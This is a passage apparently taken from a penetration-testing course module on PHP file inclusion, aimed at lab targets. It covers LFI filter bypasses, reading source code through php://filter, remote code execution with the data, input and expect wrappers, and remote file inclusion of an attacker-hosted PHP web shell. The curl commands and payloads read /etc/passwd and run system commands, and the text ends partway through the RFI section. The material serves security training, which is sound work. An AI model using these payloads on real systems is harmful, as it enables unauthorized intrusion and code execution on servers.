+<pre><code class="lang-php">$language = str_replace(<span class="hljs-string">'../'</span>, <span class="hljs-string">''</span>, $_GET[<span class="hljs-string">'language'</span>])<span class="hljs-comment">;</span>
+</code></pre>
+<p>The above code is supposed to prevent path traversal, and hence renders LFI useless. If we try the LFI payloads we tried in the previous section, we get the following:</p>
+<p><img src="storage\modules\23\lfi\_blacklist.png" alt=""></p>
+<p>We see that all <code>../</code> substrings were removed, which resulted in a final path being <code>./languages/etc/passwd</code>. However, this filter is very insecure, as it is not <code>recursively removing</code> the <code>../</code> substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if we use <code>....//</code> as our payload, then the filter would remove <code>../</code> and the output string would be <code>../</code>, which means we may still perform path traversal. Let's try applying this logic to include <code>/etc/passwd</code> again:</p>
+<p><img src="storage\modules\23\lfi\_blacklist\_passwd.png" alt=""></p>
+<p>As we can see, the inclusion was successful this time, and we're able to read <code>/etc/passwd</code> successfully. The <code>....//</code> substring is not the only bypass we can use, as we may use <code>..././</code> or <code>....\/</code> and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. <code>....\/</code>), or adding extra forward slashes (e.g. <code>....////</code>)</p>
+<hr>
+<h3 id="encoding">Encoding</h3>
+<p>Some web filters may prevent input filters that include certain LFI-related characters, like a dot <code>.</code> or a slash <code>/</code> used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function. Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass, but even on newer versions we may find custom filters that may be bypassed through URL encoding.</p>
+<p>If the target web application did not allow <code>.</code> and <code>/</code> in our input, we can URL encode <code>../</code> into <code>%2e%2e%2f</code>, which may bypass the filter. To do so, we can use any online URL encoder utility or use the Burp Suite Decoder tool, as follows: <img src="storage\modules\23\burp\_url\_encode.jpg" alt="burp\_url\_encode"></p>
+<p>Note: For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.</p>
+<p>Let's try to use this encoded LFI payload against our earlier vulnerable web application that filters <code>../</code> strings:</p>
+<p><img src="storage\modules\23\lfi\_blacklist\_passwd\_filter.png" alt=""></p>
+<p>As we can see, we were also able to successfully bypass the filter and use path traversal to read <code>/etc/passwd</code>. Furthermore, we may also use Burp Decoder to encode the encoded string once again to have a <code>double encoded</code> string, which may also bypass other types of filters.</p>
+<p>You may refer to the <a href="https://academy.hackthebox.com/module/details/109">Command Injections</a> module for more about bypassing various blacklisted characters, as the same techniques may be used with LFI as well.</p>
+<hr>
+<h3 id="approved-paths">Approved Paths</h3>
+<p>Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the <code>./languages</code> directory, as follows:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/^\.\/languages\/.+$/'</span>, $_GET[<span class="hljs-string">'language'</span>])) {
+    <span class="hljs-keyword">include</span>($_GET[<span class="hljs-string">'language'</span>]);
+} <span class="hljs-keyword">else</span> {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Illegal path specified!'</span>;
+}
+</code></pre>
+<p>To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match. To bypass this, we may use path traversal and start our payload with the approved path, and then use <code>../</code> to go back to the root directory and read the file we specify, as follows:</p>
+<p><img src="storage\modules\23\lfi\_blacklist\_passwd\_filter.png" alt=""></p>
+<p>Some web applications may apply this filter along with one of the earlier filters, so we may combine both techniques by starting our payload with the approved path, and then URL encode our payload or use recursive payload.</p>
+<p>Note: All techniques mentioned so far should work with any LFI vulnerability, regardless of the back-end development language or framework.</p>
+<hr>
+<h3 id="appended-extension">Appended Extension</h3>
+<p>As discussed in the previous section, some web applications append an extension to our input string (e.g. <code>.php</code>), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).</p>
+<p>There are a couple of other techniques we may use, but they are <code>obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4</code>. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.</p>
+<p><strong>Path Truncation</strong></p>
+<p>In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be <code>truncated</code>, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (<code>/etc/passwd/.</code>) then the <code>/.</code> would also be truncated, and PHP would call (<code>/etc/passwd</code>). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. <code>////etc/passwd</code> is the same as <code>/etc/passwd</code>). Similarly, a current directory shortcut (<code>.</code>) in the middle of the path would also be disregarded (e.g. <code>/etc/./passwd</code>).</p>
+<p>If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (<code>.php</code>) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to <code>start the path with a non-existing directory</code> for this technique to work.</p>
+<p>An example of such payload would be the following:</p>
+<p>Code: url</p>
+<pre><code class="lang-url">?language=non_existing_directory<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/passwd/</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/.[./ REPEATED ~2048 times]</span>
+</code></pre>
+<p>Of course, we don't have to manually type <code>./</code> 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:</p>
+<p>Basic Bypasses</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"non_existing_directory/../../../etc/passwd/"</span> &amp;&amp; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..2048}; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"./"</span>; <span class="hljs-keyword">done</span>
+non_existing_directory/../../../etc/passwd/./././&lt;SNIP&gt;././././
+</code></pre>
+<p>We may also increase the count of <code>../</code>, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full length of the string to ensure only <code>.php</code> gets truncated and not our requested file at the end of the string (<code>/etc/passwd</code>). This is why it would be easier to use the first method.</p>
+<p><strong>Null Bytes</strong></p>
+<p>PHP versions before 5.5 were vulnerable to <code>null byte injection</code>, which means that adding a null byte (<code>%00</code>) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.</p>
+<p>To exploit this vulnerability, we can end our payload with a null byte (e.g. <code>/etc/passwd%00</code>), such that the final path passed to <code>include()</code> would be (<code>/etc/passwd%00.php</code>). This way, even though <code>.php</code> is appended to our string, anything after the null byte would be truncated, and so the path used would actually be <code>/etc/passwd</code>, leading us to bypass the appended extension.</p>
+<h2 id="php-filters">PHP Filters</h2>
+<p>Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different <a href="https://www.php.net/manual/en/wrappers.php.php">PHP Wrappers</a> to be able to extend our LFI exploitation, and even potentially reach remote code execution.</p>
+<p>PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. This has a lot of uses for PHP developers. Still, as web penetration testers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. This is not only beneficial with LFI attacks, but also with other web attacks like XXE, as covered in the <a href="https://academy.hackthebox.com/module/details/134">Web Attacks</a> module.</p>
+<p>In this section, we will see how basic PHP filters are used to read PHP source code, and in the next section, we will see how different PHP wrappers can help us in gaining remote code execution through LFI vulnerabilities.</p>
+<hr>
+<h3 id="input-filters">Input Filters</h3>
+<p><a href="https://www.php.net/manual/en/filters.php">PHP Filters</a> are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the <code>php://</code> scheme in our string, and we can access the PHP filter wrapper with <code>php://filter/</code>.</p>
+<p>The <code>filter</code> wrapper has several parameters, but the main ones we require for our attack are <code>resource</code> and <code>read</code>. The <code>resource</code> parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the <code>read</code> parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.</p>
+<p>There are four different types of filters available for use, which are <a href="https://www.php.net/manual/en/filters.string.php">String Filters</a>, <a href="https://www.php.net/manual/en/filters.convert.php">Conversion Filters</a>, <a href="https://www.php.net/manual/en/filters.compression.php">Compression Filters</a>, and <a href="https://www.php.net/manual/en/filters.encryption.php">Encryption Filters</a>. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the <code>convert.base64-encode</code> filter, under <code>Conversion Filters</code>.</p>
+<hr>
+<h3 id="fuzzing-for-php-files">Fuzzing for PHP Files</h3>
+<p>The first step would be to fuzz for different available PHP pages with a tool like <code>ffuf</code> or <code>gobuster</code>, as covered in the <a href="https://academy.hackthebox.com/module/details/54">Attacking Web Applications with Ffuf</a> module:</p>
+<p>PHP Filters</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ffuf -w /</span>opt<span class="hljs-regexp">/useful/</span>SecLists<span class="hljs-regexp">/Discovery/</span>Web-Content<span class="hljs-regexp">/directory-list-2.3-small.txt:FUZZ -u http:/</span><span class="hljs-regexp">/&lt;SERVER_IP&gt;:&lt;PORT&gt;/</span>FUZZ.php
+
+...SNIP...
+
+index                   [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">2652</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">690</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">64</span>]
+config                  [<span class="hljs-string">Status:</span> <span class="hljs-number">302</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">0</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">1</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">1</span>]
+</code></pre>
+<p>Tip: Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.</p>
+<p>Even after reading the sources of any identified files, we can <code>scan them for other referenced PHP files</code>, and then read those as well, until we are able to capture most of the web application's source or have an accurate image of what it does. It is also possible to start by reading <code>index.php</code> and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.</p>
+<hr>
+<h3 id="standard-php-inclusion">Standard PHP Inclusion</h3>
+<p>In previous sections, if you tried to include any php files through LFI, you would have noticed that the included PHP file gets executed, and eventually gets rendered as a normal HTML page. For example, let's try to include the <code>config.php</code> page (<code>.php</code> extension appended by web application):</p>
+<p><img src="storage\modules\23\lfi\_config\_failed.png" alt=""></p>
+<p>As we can see, we get an empty result in place of our LFI string, since the <code>config.php</code> most likely only sets up the web app configuration and does not render any HTML output.</p>
+<p>This may be useful in certain cases, like accessing local PHP pages we do not have access over (i.e. SSRF), but in most cases, we would be more interested in reading the PHP source code through LFI, as source codes tend to reveal important information about the web application. This is where the <code>base64</code> php filter gets useful, as we can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered. This is especially useful for cases where we are dealing with LFI with appended PHP extensions, because we may be restricted to including PHP files only, as discussed in the previous section.</p>
+<p>Note: The same applies to web application languages other than PHP, as long as the vulnerable function can execute files. Otherwise, we would directly get the source code, and would not need to use extra filters/functions to read the source code. Refer to the functions table in section 1 to see which functions have which privileges.</p>
+<hr>
+<h3 id="source-code-disclosure">Source Code Disclosure</h3>
+<p>Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the <code>base64</code> PHP filter. Let's try to read the source code of <code>config.php</code> using the base64 filter, by specifying <code>convert.base64-encode</code> for the <code>read</code> parameter and <code>config</code> for the <code>resource</code> parameter, as follows:</p>
+<p>Code: url</p>
+<pre><code class="lang-url">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=config
+</code></pre>
+<p><img src="storage\modules\23\lfi\_config\_wrapper.png" alt=""></p>
+<p>Note: We intentionally left the resource file at the end of our string, as the <code>.php</code> extension is automatically appended to the end of our input string, which would make the resource we specified be <code>config.php</code>.</p>
+<p>As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier. We can now decode this string to get the content of the source code of <code>config.php</code>, as follows:</p>
+<p>PHP Filters</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">echo</span> <span class="hljs-string">'PD9waHAK...SNIP...KICB9Ciov'</span> | base64 -d
+
+...SNIP...
+
+<span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">'GET'</span> &amp;&amp; realpath(<span class="hljs-keyword">__FILE__</span>) == realpath($_SERVER[<span class="hljs-string">'SCRIPT_FILENAME'</span>])) {
+  header(<span class="hljs-string">'HTTP/1.0 403 Forbidden'</span>, <span class="hljs-keyword">TRUE</span>, <span class="hljs-number">403</span>);
+  <span class="hljs-keyword">die</span>(header(<span class="hljs-string">'location: /index.php'</span>));
+}
+
+...SNIP...
+</code></pre>
+<p>Tip: When copying the base64 encoded string, be sure to copy the entire string or it will not fully decode. You can view the page source to ensure you copy the entire string.</p>
+<p>We can now investigate this file for sensitive information like credentials or database keys and start identifying further references and then disclose their sources.</p>
+<h2 id="php-wrappers">PHP Wrappers</h2>
+<p>So far in this module, we have been exploiting file inclusion vulnerabilities to disclose local files through various methods. From this section, we will start learning how we can use file inclusion vulnerabilities to execute code on the back-end servers and gain control over them.</p>
+<p>We can use many methods to execute remote commands, each of which has a specific use case, as they depend on the back-end language/framework and the vulnerable function's capabilities. One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file like <code>config.php</code>, which may match a user's password in case they re-use the same password. Or we can check the <code>.ssh</code> directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (<code>id_rsa</code>) and use it to SSH into the system.</p>
+<p>Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications. We will build on what we learned in the previous section, and will utilize different <code>PHP Wrappers</code> to gain remote code execution. Then, in the upcoming sections, we will learn other methods to gain remote code execution that can be used with PHP and other languages as well.</p>
+<hr>
+<h3 id="data">Data</h3>
+<p>The <a href="https://www.php.net/manual/en/wrappers.data.php">data</a> wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (<code>allow_url_include</code>) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.</p>
+<p><strong>Checking PHP Configurations</strong></p>
+<p>To do so, we can include the PHP configuration file found at (<code>/etc/php/X.Y/apache2/php.ini</code>) for Apache or at (<code>/etc/php/X.Y/fpm/php.ini</code>) for Nginx, where <code>X.Y</code> is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the <code>base64</code> filter we used in the previous section, as <code>.ini</code> files are similar to <code>.php</code> files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:</p>
+<p>PHP Wrappers</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl "http://<span class="hljs-tag">&lt;<span class="hljs-name">SERVER_IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+<span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
+...SNIP...
+ <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Containers<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
+    W1BIUF0KCjs7Ozs7Ozs7O
+    ...SNIP...
+    4KO2ZmaS5wcmVsb2FkPQo=
+<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"read-more"</span>&gt;</span>
+</code></pre>
+<p>Once we have the base64 encoded string, we can decode it and <code>grep</code> for <code>allow_url_include</code> to see its value:</p>
+<p>PHP Wrappers</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo='</span> | base64 <span class="hljs-_">-d</span> | grep allow_url_include
+
+allow_url_include = On
+</code></pre>
+<p>Excellent! We see that we have this option enabled, so we can use the <code>data</code> wrapper. Knowing how to check for the <code>allow_url_include</code> option can be very important, as <code>this option is not enabled by default</code>, and is required for several other LFI attacks, like using the <code>input</code> wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.</p>
+<p><strong>Remote Code Execution</strong></p>
+<p>With <code>allow_url_include</code> enabled, we can proceed with our <code>data</code> wrapper attack. As mentioned earlier, the <code>data</code> wrapper can be used to include external data, including PHP code. We can also pass it <code>base64</code> encoded strings with <code>text/plain;base64</code>, and it has the ability to decode them and execute the PHP code.</p>
+<p>So, our first step would be to base64 encode a basic PHP web shell, as follows:</p>
+<p>PHP Wrappers</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ echo '<span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">"cmd"</span>]); <span class="hljs-meta">?&gt;</span></span>' | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+</code></pre>
+<p>Now, we can URL encode the base64 string, and then pass it to the data wrapper with <code>data://text/plain;base64,</code>. Finally, we can use pass commands to the web shell with <code>&amp;cmd=&lt;COMMAND&gt;</code>:</p>
+<p><img src="storage\modules\23\data\_wrapper\_id.png" alt=""></p>
+<p>We may also use cURL for the same attack, as follows:</p>
+<p>PHP Wrappers</p>
+<pre><code class="lang-shell-session"><span class="hljs-title">root</span>@htb[/htb]$ curl -s 'http://&lt;<span class="hljs-type">SERVER_IP</span>&gt;:&lt;<span class="hljs-type">PORT</span>&gt;/index.php?language=<span class="hljs-class"><span class="hljs-keyword">data</span>://text/plain;base64,<span class="hljs-type">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8</span>%2BCg%3D%3D&amp;cmd=id' | grep uid</span>
+            uid=<span class="hljs-number">33</span>(www-<span class="hljs-class"><span class="hljs-keyword">data</span>) gid=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>) groups=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>)</span>
+</code></pre>
+<hr>
+<h3 id="input">Input</h3>
+<p>Similar to the <code>data</code> wrapper, the <a href="https://www.php.net/manual/en/wrappers.php.php">input</a> wrapper can be used to include external input and execute PHP code. The difference between it and the <code>data</code> wrapper is that we pass our input to the <code>input</code> wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the <code>input</code> wrapper also depends on the <code>allow_url_include</code> setting, as mentioned earlier.</p>
+<p>To repeat our earlier attack but with the <code>input</code> wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:</p>
+<p>PHP Wrappers</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s -X POST --data '<span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">"cmd"</span>]); <span class="hljs-meta">?&gt;</span></span>' "http://<span class="hljs-tag">&lt;<span class="hljs-name">SERVER_IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/index.php?language=php://input&amp;cmd=id" | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use <code>$_REQUEST</code>). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <code>&lt;\?php system('id')?&gt;</code>)</p>
+<hr>
+<h3 id="expect">Expect</h3>
+<p>Finally, we may utilize the <a href="https://www.php.net/manual/en/wrappers.expect.php">expect</a> wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.</p>
+<p>However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with <code>allow_url_include</code> earlier, but we'd <code>grep</code> for <code>expect</code> instead, and if it is installed and enabled we'd get the following:</p>
+<p>PHP Wrappers</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo='</span> | base64 <span class="hljs-_">-d</span> | grep expect
+extension=expect
+</code></pre>
+<p>As we can see, the <code>extension</code> configuration keyword is used to enable the <code>expect</code> module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the <code>expect://</code> wrapper and then pass the command we want to execute, as follows:</p>
+<p>PHP Wrappers</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -s "http:/</span><span class="hljs-regexp">/&lt;SERVER_IP&gt;:&lt;PORT&gt;/</span>index.php?language=expect:<span class="hljs-comment">//id"</span>
+uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)
+</code></pre>
+<p>As we can see, executing commands through the <code>expect</code> module is fairly straightforward, as this module was designed for command execution, as mentioned earlier. The <a href="https://academy.hackthebox.com/module/details/134">Web Attacks</a> module also covers using the <code>expect</code> module with XXE vulnerabilities, so if you have a good understanding of how to use it here, you should be set up for using it with XXE.</p>
+<p>These are the most common three PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover the <code>phar</code> and <code>zip</code> wrappers in upcoming sections, which we may use with web applications that allow file uploads to gain remote execution through LFI vulnerabilities.</p>
+<h2 id="remote-file-inclusion-rfi-">Remote File Inclusion (RFI)</h2>
+<p>So far in this module, we have been mainly focusing on <code>Local File Inclusion (LFI)</code>. However, in some cases, we may also be able to include remote files "<a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.2-Testing\_for\_Remote\_File\_Inclusion">Remote File Inclusion (RFI)</a>", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:</p>
+<ol>
+<li>Enumerating local-only ports and web applications (i.e. SSRF)</li>
+<li>Gaining remote code execution by including a malicious script that we host</li>
+</ol>
+<p>In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The <a href="https://academy.hackthebox.com/module/details/145">Server-side Attacks</a> module covers various <code>SSRF</code> techniques, which may also be used with RFI vulnerabilities.</p>
+<h3 id="local-vs-remote-file-inclusion">Local vs. Remote File Inclusion</h3>
+<p>When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain remote code execution. If we refer to the table on the first section, we see that the following are some of the functions that (if vulnerable) would allow RFI:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th style="text-align:center"><strong>Read Content</strong></th>
+<th style="text-align:center"><strong>Execute</strong></th>
+<th style="text-align:center"><strong>Remote URL</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>include()</code>/<code>include_once()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td><code>@Html.RemotePartial()</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">❌</td>
+<td style="text-align:center">✅</td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+<td style="text-align:center">✅</td>
+</tr>
+</tbody>
+</table>
+<p>As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:</p>
+<ol>
+<li>The vulnerable function may not allow including remote URLs</li>
+<li>You may only control a portion of the filename and not the entire protocol wrapper (ex: <code>http://</code>, <code>ftp://</code>, <code>https://</code>).</li>
+<li>The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.</li>
+</ol>
+<p>Furthermore, as we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.</p>
+<h3 id="verify-rfi">Verify RFI</h3>
+<p>In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the <code>allow_url_include</code> setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:</p>
+<p>Remote File Inclusion (RFI)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo='</span> | base64 <span class="hljs-_">-d</span> | grep allow_url_include
+
+allow_url_include = On
+</code></pre>
+<p>However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to <code>try and include a URL</code>, and see if we can get its content. At first, <code>we should always start by trying to include a local URL</code> to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (<code>http://127.0.0.1:80/index.php</code>) as our input string and see if it gets included:</p>
+<p><img src="storage\modules\23\lfi\_local\_url\_include.jpg" alt=""></p>
+<p>As we can see, the <code>index.php</code> page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the <code>index.php</code> page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.</p>
+<p>We also see that we were able to specify port <code>80</code> and get the web application on that port. If the back-end server hosted any other local web applications (e.g. port <code>8080</code>), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.</p>
+<p>Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.</p>
+<h3 id="remote-code-execution-with-rfi">Remote Code Execution with RFI</h3>
+<p>The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:</p>
+<p>Remote File Inclusion (RFI)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ echo '<span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">"cmd"</span>]); <span class="hljs-meta">?&gt;</span></span>' &gt; shell.php
+</code></pre>
+<p>Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like <code>80</code> or <code>443</code>, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.</p>
+<h3 id="http">HTTP</h3>
+<p>Now, we can start a server on our machine with a basic python server with the following command, as follows:</p>
+<p>Remote File Inclusion (RFI)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo python3 -m http.server <span class="hljs-variable">&lt;LISTENING_PORT&gt;</span>
+Serving HTTP <span class="hljs-keyword">on</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-keyword">port</span> <span class="hljs-variable">&lt;LISTENING_PORT&gt;</span> (http://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-variable">&lt;LISTENING_PORT&gt;</span>/) ...
+</code></pre>
+<p>Now, we can include our local shell through RFI, like we did earlier, but using <code>&lt;OUR_IP&gt;</code> and our <code>&lt;LISTENING_PORT&gt;</code>. We will also specify the command to be executed with <code>&amp;cmd=id</code>:</p>
+<p><img src="storage\modules\23\rfi\_localhost.jpg" alt=""></p>
+<p>As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command:</p>
+<p>Remote File Inclusion (RFI)</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo python3 -m http.server &lt;LISTENING_PORT&gt;
